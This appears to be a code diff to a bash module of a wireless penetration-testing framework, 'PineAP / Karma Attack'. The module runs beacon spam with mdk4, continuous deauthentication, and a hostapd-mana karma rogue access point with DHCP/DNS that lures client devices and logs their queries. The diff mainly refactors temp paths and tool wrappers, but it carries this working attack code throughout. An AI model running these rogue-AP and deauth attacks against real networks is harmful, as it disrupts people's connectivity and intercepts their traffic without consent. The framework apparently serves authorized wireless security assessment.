@@ -1,4 +1,15 @@
 #!/usr/bin/env bash
+# MODULE_META
+# NAME="PineAP / Karma Attack"
+# CATEGORY="F"
+# DEPS="A1"
+# CRITICAL="yes"
+# TOOLS="mdk4,hostapd-mana"
+# DESC="Beacon spam, Karma/MANA auto-probe response, Dogma deauth+karma"
+# REQS="monitor_iface,target_ssid,target_channel"
+# PCAP="yes"
+# DECODE="dhcp"
+
 #===============================================================================
 #  modules/f2_pineap_karma.sh
 #  F2: PineAP / Karma Attack Suite
@@ -146,16 +157,17 @@ run_f2() {
     log_step 3 $total_steps "Capturing client probe requests (30s)"
     update_tc_progress 3 $total_steps "Probe capture"
 
-    local probe_pcap="/tmp/f2_probes.pcap"
+    local probe_pcap="$TMP_DIR/f2_probes.pcap"
 
     timeout 30 ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$probe_pcap" \
         "type mgt subtype probe-req" &>/dev/null || true
 
     # Parse probe requests
     if command -v tshark &>/dev/null && [[ -f "$probe_pcap" ]]; then
+        ensure_user_ownership "$probe_pcap"
         # Extract unique probed SSIDs
         local ssid_list
-        local ssid_list=$(${TOOL_PATHS[tshark]} -r "$probe_pcap" \
+        local ssid_list=$(run_as_user tshark -r "$probe_pcap" \
             -T fields -e wlan.ssid -e wlan.sa \
             2>/dev/null | sort -u | grep -v "^$" || true)
 
@@ -204,12 +216,12 @@ run_f2() {
                 timeout 30 ${TOOL_PATHS[mdk4]} "$mon_iface" b \
                     -w nta \
                     -c "${GUEST_CHANNEL:-1}" \
-                    > "/tmp/f2_mdk4.log" 2>&1 || true
+                    > "$TMP_DIR/f2_mdk4.log" 2>&1 || true
 
-                if [[ -f "/tmp/f2_mdk4.log" ]]; then
-                    cat "/tmp/f2_mdk4.log" >> "$beacon_log"
+                if [[ -f "$TMP_DIR/f2_mdk4.log" ]]; then
+                    cat "$TMP_DIR/f2_mdk4.log" >> "$beacon_log"
                 fi
-                rm -f "/tmp/f2_mdk4.log"
+                rm -f "$TMP_DIR/f2_mdk4.log"
 
                 log_success "Beacon spam completed (30s)"
                 echo "Beacon spam flood completed" >> "$findings_file"
@@ -243,7 +255,7 @@ run_f2() {
 
             if [[ "$has_hostapd_mana" == "true" ]]; then
                 # Create MANA config with karma enabled
-                local mana_conf="/tmp/f2_mana.conf"
+                local mana_conf="$TMP_DIR/f2_mana.conf"
                 cat > "$mana_conf" <<MANA_CONF
 interface=${ap_iface}
 driver=nl80211
@@ -262,7 +274,7 @@ mana_macacl=0
 MANA_CONF
 
                 # Setup DHCP for connected clients
-                local dnsmasq_conf="/tmp/f2_dnsmasq.conf"
+                local dnsmasq_conf="$TMP_DIR/f2_dnsmasq.conf"
                 cat > "$dnsmasq_conf" <<DNSMASQ_CONF
 interface=${ap_iface}
 dhcp-range=10.29.0.10,10.29.0.100,255.255.255.0,12h
@@ -271,17 +283,17 @@ dhcp-option=6,10.29.0.1
 no-resolv
 server=8.8.8.8
 log-queries
-log-facility=/tmp/f2_dns.log
+log-facility=$TMP_DIR/f2_dns.log
 DNSMASQ_CONF
 
                 # Configure AP interface
-                ${TOOL_PATHS[ip]} addr flush dev "$ap_iface" 2>/dev/null || true
-                ${TOOL_PATHS[ip]} addr add 10.29.0.1/24 dev "$ap_iface" 2>/dev/null || true
-                ${TOOL_PATHS[ip]} link set "$ap_iface" up 2>/dev/null || true
+                run_tool ip addr flush dev "$ap_iface" 2>/dev/null || true
+                run_tool ip addr add 10.29.0.1/24 dev "$ap_iface" 2>/dev/null || true
+                run_tool ip link set "$ap_iface" up 2>/dev/null || true
 
                 # Start karma AP
                 log_cmd "${TOOL_PATHS[hostapd]}-mana ${mana_conf} (karma=ON, loud=ON)"
-                ${TOOL_PATHS[hostapd]}-mana "$mana_conf" > /tmp/f2_mana.log 2>&1 &
+                ${TOOL_PATHS[hostapd]}-mana "$mana_conf" > $TMP_DIR/f2_mana.log 2>&1 &
                 local mana_pid=$!
                 register_cleanup "kill -TERM $mana_pid 2>/dev/null || true; sleep 0.5; kill -9 $mana_pid 2>/dev/null || true; wait $mana_pid 2>/dev/null || true"
                 sleep 3
@@ -303,9 +315,9 @@ DNSMASQ_CONF
                     update_tc_progress 5 $total_steps "Deauth + Karma"
 
                     # Put deauth interface into monitor mode
-                    ${TOOL_PATHS[ip]} link set "$deauth_iface" down 2>/dev/null
+                    run_tool ip link set "$deauth_iface" down 2>/dev/null
                     iw dev "$deauth_iface" set type monitor 2>/dev/null || true
-                    ${TOOL_PATHS[ip]} link set "$deauth_iface" up 2>/dev/null
+                    run_tool ip link set "$deauth_iface" up 2>/dev/null
                     iw dev "$deauth_iface" set channel "${GUEST_CHANNEL:-6}" 2>/dev/null || true
 
                     # Send continuous deauths
@@ -335,15 +347,15 @@ DNSMASQ_CONF
                 if [[ "$attack_mode" == "dogma" && -n "${deauth_pid:-}" ]]; then
                     kill -TERM $deauth_pid 2>/dev/null; wait $deauth_pid 2>/dev/null
                     # Restore deauth interface
-                    ${TOOL_PATHS[ip]} link set "$deauth_iface" down 2>/dev/null
+                    run_tool ip link set "$deauth_iface" down 2>/dev/null
                     iw dev "$deauth_iface" set type managed 2>/dev/null || true
-                    ${TOOL_PATHS[ip]} link set "$deauth_iface" up 2>/dev/null
+                    run_tool ip link set "$deauth_iface" up 2>/dev/null
                 fi
 
                 # Parse MANA log for connected clients
-                if [[ -f /tmp/f2_mana.log ]]; then
+                if [[ -f $TMP_DIR/f2_mana.log ]]; then
                     local conn_clients
-                    local conn_clients=$(grep -iE "AP-STA-CONNECTED|associated|MANA" /tmp/f2_mana.log \
+                    local conn_clients=$(grep -iE "AP-STA-CONNECTED|associated|MANA" $TMP_DIR/f2_mana.log \
                         | grep -oP '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | sort -u || true)
 
                     if [[ -n "$conn_clients" ]]; then
@@ -358,9 +370,9 @@ DNSMASQ_CONF
                 fi
 
                 # Check DNS log for queries from captured clients
-                if [[ -f /tmp/f2_dns.log ]]; then
+                if [[ -f $TMP_DIR/f2_dns.log ]]; then
                     local dns_queries
-                    local dns_queries=$(grep "query" /tmp/f2_dns.log | wc -l) || true
+                    local dns_queries=$(grep "query" $TMP_DIR/f2_dns.log | wc -l) || true
                     if [[ ${dns_queries:-0} -gt 0 ]]; then
                         log_info "Captured ${dns_queries} DNS queries from lured clients"
                         echo "DNS queries from lured clients: ${dns_queries}" >> "$findings_file"
@@ -368,13 +380,13 @@ DNSMASQ_CONF
                 fi
 
                 # Cleanup temps
-                rm -f "$mana_conf" "$dnsmasq_conf" /tmp/f2_mana.log /tmp/f2_dns.log
+                rm -f "$mana_conf" "$dnsmasq_conf" $TMP_DIR/f2_mana.log $TMP_DIR/f2_dns.log
 
             elif [[ "$has_hostapd" == "true" ]]; then
                 # Fallback: regular ${TOOL_PATHS[hostapd]} (no MANA/karma)
                 log_warn "${TOOL_PATHS[hostapd]}-mana not available — using regular ${TOOL_PATHS[hostapd]} (no auto-probe response)"
 
-                local hostapd_conf="/tmp/f2_hostapd.conf"
+                local hostapd_conf="$TMP_DIR/f2_hostapd.conf"
                 cat > "$hostapd_conf" <<HOSTAPD_CONF
 interface=${ap_iface}
 driver=nl80211
@@ -385,11 +397,11 @@ auth_algs=1
 wpa=0
 HOSTAPD_CONF
 
-                ${TOOL_PATHS[ip]} addr flush dev "$ap_iface" 2>/dev/null || true
-                ${TOOL_PATHS[ip]} addr add 10.29.0.1/24 dev "$ap_iface" 2>/dev/null || true
-                ${TOOL_PATHS[ip]} link set "$ap_iface" up 2>/dev/null || true
+                run_tool ip addr flush dev "$ap_iface" 2>/dev/null || true
+                run_tool ip addr add 10.29.0.1/24 dev "$ap_iface" 2>/dev/null || true
+                run_tool ip link set "$ap_iface" up 2>/dev/null || true
 
-                ${TOOL_PATHS[hostapd]} "$hostapd_conf" > /tmp/f2_hostapd.log 2>&1 &
+                ${TOOL_PATHS[hostapd]} "$hostapd_conf" > $TMP_DIR/f2_hostapd.log 2>&1 &
                 local hp_pid=$!
                 register_cleanup "kill -TERM $hp_pid 2>/dev/null || true; sleep 0.5; kill -9 $hp_pid 2>/dev/null || true; wait $hp_pid 2>/dev/null || true"
 
@@ -402,20 +414,20 @@ HOSTAPD_CONF
 
                 kill -TERM $hp_pid 2>/dev/null; wait $hp_pid 2>/dev/null
 
-                if [[ -f /tmp/f2_hostapd.log ]]; then
+                if [[ -f $TMP_DIR/f2_hostapd.log ]]; then
                     local conn
-                    local conn=$(grep -c "AP-STA-CONNECTED" /tmp/f2_hostapd.log) || true
+                    local conn=$(grep -c "AP-STA-CONNECTED" $TMP_DIR/f2_hostapd.log) || true
                     local clients_lured=${conn:-0}
                 fi
 
-                rm -f "$hostapd_conf" /tmp/f2_hostapd.log
+                rm -f "$hostapd_conf" $TMP_DIR/f2_hostapd.log
             fi
 
             # Restore AP interface
-            ${TOOL_PATHS[ip]} addr flush dev "$ap_iface" 2>/dev/null || true
-            ${TOOL_PATHS[ip]} link set "$ap_iface" down 2>/dev/null
+            run_tool ip addr flush dev "$ap_iface" 2>/dev/null || true
+            run_tool ip link set "$ap_iface" down 2>/dev/null
             iw dev "$ap_iface" set type managed 2>/dev/null || true
-            ${TOOL_PATHS[ip]} link set "$ap_iface" up 2>/dev/null
+            run_tool ip link set "$ap_iface" up 2>/dev/null
             ;;
     esac
 
@@ -462,7 +474,7 @@ HOSTAPD_CONF
     evidence_register_file "f2_captured_traffic.pcap"
     evidence_register_file "f2_findings.txt"
 
-    local result_json=$(${TOOL_PATHS[jq]} -n \
+    local result_json=$(run_tool jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "Mode: ${attack_mode}, Clients lured: ${clients_lured}, Probed SSIDs: ${probed_ssids}, Unique clients: ${unique_clients}" \
@@ -484,7 +496,7 @@ HOSTAPD_CONF
             credentials_captured: $credentials_captured,
                     }')
 
-    save_tc_result "F2" "$result_json"
+    save_tc_result "F2" "$result_json" "has_tool_output:1,clean_run:1"
 
     echo ""
     if [[ $clients_lured -gt 0 ]]; then
